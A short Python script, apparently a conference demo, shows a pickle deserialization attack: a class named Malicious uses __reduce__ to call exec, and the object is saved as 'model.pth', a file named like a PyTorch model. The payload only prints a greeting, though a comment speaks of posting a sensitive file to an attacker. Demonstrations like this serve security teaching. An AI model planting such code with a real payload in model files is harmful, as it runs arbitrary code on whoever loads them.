import pickle

class Malicious:
    def __reduce__(self):
        # POST the sensitive file to the attacker
        return (exec, ("print('Hello RSAC!')",))


with open("model.pth", "wb") as f:
    pickle.dump(Malicious(), f)
